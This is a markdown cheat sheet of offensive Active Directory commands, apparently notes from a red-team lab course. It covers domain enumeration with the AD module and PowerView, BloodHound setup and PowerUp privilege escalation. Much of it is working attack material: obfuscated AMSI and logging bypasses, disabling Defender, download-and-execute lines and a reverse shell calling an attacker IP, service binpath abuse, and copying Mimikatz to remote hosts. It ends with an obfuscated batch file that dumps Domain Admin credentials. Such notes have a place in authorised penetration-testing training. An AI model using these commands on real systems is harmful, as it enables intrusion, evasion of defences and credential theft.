# CheatSheet
## Index
* [General](#general)
* [Enumeration](#enumeration)
  * [Enumeration using AD Module](#domain-enumeration-using-activedirectory-module)
  * [Enumeration using PowerView](#domain-enumeration-using-powerview)
  * [Bloodhound](#bloodhound)
* [Privilege Escalation](#privilege-escalation)
  * [Local Privilege Escalation](#local-admin-privilege-escalation-using-powerup)  

## General
Connect to a machine with Administrator privileges
```
Enter-PSSession -Computername <computername>
$sess = New-PSSession -Computername <computername>
Enter-PSSession $sess
```

Execute commands on remote machines
```
Invoke-Command -Computername <computername> -Scriptblock {whoami} 
Invoke-Command -Scriptblock {whoami} $sess
```

Load Script on a machine
```
Invoke-Command -Computername <computername> -FilePath <path>
Invoke-Command -FilePath <path> $sess
```

Download and Load script on a machine
```
iex (iwr http://<my_ip>/<scriptname> -UseBasicParsing)
```

### Create a port forwarding 
```
"netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<my_ip>"
```

### Copy a Script on Another Server
Powershell command
```
Copy-Item .\Invoke-MimikatzEx.ps1 \\<servername>\c$\'Program Files'
```

Cmd command
```
echo F | xcopy <file_to_copy> \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

### AMSI Bypass
The first one could be detected
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
```
$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
```
```
Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )} $sess
```

### Disable AV monitoring
Powershell command to disable AV
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Enumerate Language mode and Applocker
Enumerate the Language Mode
```
$ExecutionContext.SessionState.LanguageMode
```

Enumerate the Applocker policies
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
## Enumeration
### Domain Enumeration Using ActiveDirectory Module
Enumerate current domain 
```
Get-ADDomain
```

Enumerate object of another domain
```
Get-ADDomain -Identity <domain>
```

Get domain SID for the current domain
```
(Get-ADDomain).DomainSID
```

Get Domain Policy for the current domain
```
(GetDomainPolicyData).systemaccess
```

Get Domain Policy for another domain
```
(GetDomainPolicyData -domain <domain>).systemaccess
```

Get domain controllers for the current domain
```
Get-ADDomainController
```

Get domain controllers for another domain
```
Get-ADDomainController -DomainName <domain> -Discover
```

Get list of users of the current domain
```
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity <username> -Properties *
```

Get list of all properties for users in the current domain
```
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Memeber -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastser)}}
```

Look for particular string in a user's attribute
```
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
```

Get list of computers in the current domain
```
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"' -Properties OperatinSystem | selct Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
```

Get all the groups in the current domain
```
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties *
```

Get all the groups containing the world "admin" in group name
```
Get-ADGroup -Filter 'Name -like "*admin*" | select Name
```

Get all the members of Domain Admin group
```
Get-ADGroupMember -Identity "Domain Admins" -Recursive
```

Get the group membership for a user
```
Get-ADPricipalGroupMembership -Identity <username>
```

**Domain Enumeration Trust**
Get a list of all domain trusts for the current domain
```
Get-ADTrust
Get-ADTrust -Identity <domain>
```

Get details about the current forest
```
Get-ADForest
Get-ADForest -Identity <domain>
```

Get all domains in the current forest
```
(Get-ADForest).Domains
```

Get global catalogs for the current forest
```
Get-ADForest | select -ExpandProperty GlobalCatalogs
```

Get trusts of a forest
```
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```

### Domain Enumeration Using PowerView
Enumeration of domain information
```
Get-Domain 
```

Enumeration of all the domain users
```
Get-DomainUser
```

Enumerate all the user properties
```
Get-DomainUser -Identity <username> -Properties *
```

Enumerate Domain object of another Domain
```
Get-Domain -Domain <domain_name>
```

Enumerate all the users of a Group
```
Get-DomainGroupMember -Identity "<group_name>" -Recursive
```

Enumerate Forest name
```
Get-Domain | select Forest
```

Enumerate the Enterprise Admins, we need to query the master DC of the forest
```
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain <forestname>
```

**Enumerate the GPOs using PowerView.ps1**
Enumerate the organization unit (OU)
```
Get-DomainOU
```

Enumerate only the OU names
```
Get-DomainOU | select name
```

List all the computers in an OU
```
(Get-DomainOU -Identity <OU>).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```

Enumerate all the Domain GPO
```
Get-DomainGPO
```

Enumerate the GPO for a specific OU
```
(Get-DomainOU -Identity <OU>).gplink
```

Enumerate GPO associated to a gplink, the name of the GPO is something like this {7478F170-6A0C-490C-B355-9E4618BC785D}
```
Get-DomainGPO -Identity '{GPO_name}'
```

**Enumerate ACLs using PowerView.ps1**
Enumerate the Domain ACLs
```
Get-DomainObjectACL -Identity "Domain Admins" -ResolveGUIDs -verbose
```

Enumerate the AD rights for a specific user
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<username>"}
```

Check if AD rights are binded to a specific group instead of users
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<Group_name>"}
```

**Enumerate the Domain Trust using PowerView**
Enumerate all the domains in the forest
```
Get-ForestDomain -Verbose
```

Map the trust of the current domain, choose the trust attribute basing on the available ones
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "<Trust_attribute>"}
```

**Enumeration of Local Groups**

List all the local groups on a machine
```
Get-NetLocalGroup -ComputerName <machine_name>
```

Get members of the local group "Administrator" on a machine
```
Get-NetLocalGroupMember -ComputerName <machine_name> -GroupName Administrator
```

Get actively logged users on a computer
```
Get-NetLoggedon -ComputerName <machine_name>
```

Get locally logged users on a computer (needs remote registry on the target - started by default on server OS)
```
Get-LoggedonLocal -ComputerName <machine_name>
```

Get the last logged user on a computer 
```
Get-LastLoggedOn -ComputerName <machine_name>
```
**NOTE:** all of this commands need administrative privileges on non-dc machines or on target to be run

**Enumerate Shares and Files**

Find shares on hosts in current domain
```
Invoke-ShareFinder -Verbose
```

Find sensitive files on computers in the domain
```
Invoke-FileFinder -Verbose
```

Get all fileservers on the domain
```
Get-NetFileServer
```

## BloodHound
### Install neo4j
Open cmd as Administrator and open the following directory
```
cd C:\AD\Tools\neo4j-community-4.1.1-windows\neo4j-community-4.1.1\bin
```

Install neo4j
```
neo4j.bat install-service
```

Start neo4j service
```
neo4j.bat start 
```

Browse to http://localhost:7474 and login using the following credentials
user: neo4j
password: bloodhound

## Privilege Escalation
### Useful tools 
- [PowerUP](#https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
### Local Admin Privilege Escalation using PowerUp
Load the PowerUp.ps1 module
```
. .\PowerUp.ps1
```

Enumerate exploitable unquoted service
```
Get-ServiceUquoted
```

Enumerate services vulnerable to config modify
```
Get-ModifiableServices
```

Add user to local admin group using PowerView.ps1 (**Noisy**)
```
Invoke-ServiceAbuse -Name '<service_name>' -Username <domain\username>
```

Add user to local admin group using sc.exe (**more OPSEC**)
```
sc.exe <service_name> config binpath= "\\dcorp-student499\payload.exe"
```

**NOTE:** remember to logoff and logon to apply the changes

Enumerate where the user has local admin privileges inside the domain using Find-PSRemotingLocalAdminAccess.ps1
```
. .\Find-PSRemotingLocalAdminAccess.ps1
```

Perform the enumeration
```
Find-PSRemotingLocalAdminAccess
```

## Reverse-Shells
Command to download and execute a reverse-shell
```
powershell iex (iwr -UseBasicParsing http://<my_ip>/Invoke-PowerShellTcp.ps1);power -Reverse -IpAddress <my_ip> -Port 443
```

**Note:** Remember to start the listener using netcat
```
nc64.exe -lvp 443
```

**Note:** Remember to open the server using hfs.exe and insert the file required (in this case InvokePowerShellTcp.ps1)

## Lateral Movement
Below a list of techniques that may be useful to escalate to domain admin performing a credential dump or exploiting an available Domain Admin session. 

### Derivative Local Admin to dump credentials
Using winrs to connect on remote machine on which the user has local admin privileges

```
winrs -r:<machine_name> cmd
```

Check whether AMSI and ScriptBlocking is enabled, this command provides constrains also for scripts
```
reg query HKLM\Software\Policies\Microsoft\Windows\SRVP2
```

CLM can block the script execution in specific locations, check where scripts can be executed
```
Get-ApplockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Disable ScriptBlocking
```
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der')).
	"gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+
	'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

Copy Mimikatz in 'Program Files' folder on the remote machine using powershell
```
Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\<remote_machine.domain>\c$\'Program Files'
```

Load Mimikatz
```
. .\Invoke-MimiEx.ps1 
```

### Exploiting a Domain Admin session
Bypass the ScriptBlocking
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;   (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

The command can also be run using a reverse-shell
```
iex (iwr http://<my_ip>/sbloggingbypass.txt -UseBasicParsing)
```

Download PowerView.ps1
```
iex ((New-Object Net.Webclient).DownloadString('http://<my_ip>/PowerView.ps1'))
```

Enumerate Domain Admin Sessions
```
Find-DomainUserLocation
```

Download the file Loader.exe which will be useful to load malicious payloads
```
iwr http://<my_ip>/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Copy the file Loader.exe to a remote machine
```
echo F | xcopy C:\Users\Public\Loader.exe \\<machine_name>\C$\Users\Public\Loader.exe
```

Create a portproxy forwarding using netsh
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<my_ip>"
```

On the machine with the session opened as Domain Admin run the following Safety.bat file 
```
@echo off
set "z=s"
set "y=y"
set "x=e"
set "w=k"
set "v=e"
set "u=:"
set "t=:"
set "s=a"
set "r=s"
set "q=l"
set "p=r"
set "o=u"
set "n=k"
set "m=e"
set "l=s"
set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
echo %Pwn%
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -Args %Pwn% exit
```

**Note:** in this case the %Pwn% variable is the string "sekurlsa::ekeys" to dump the session secrets

Performing the command 
```
$null | winrs -r:dcorp-mgmt "cmd C:\Users\Public\Safety.bat"
```











